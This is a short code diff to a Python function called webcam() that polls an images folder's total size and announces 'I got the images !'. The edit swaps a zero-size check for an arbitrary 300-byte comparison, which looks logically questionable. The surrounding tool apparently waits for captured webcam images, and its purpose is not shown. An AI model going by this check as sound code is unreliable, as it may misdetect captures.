@@ -121,7 +121,7 @@ def webcam():
    
     while True:
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
-        if folder != 0:
+        if folder != 300:
            print(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)
 
            break
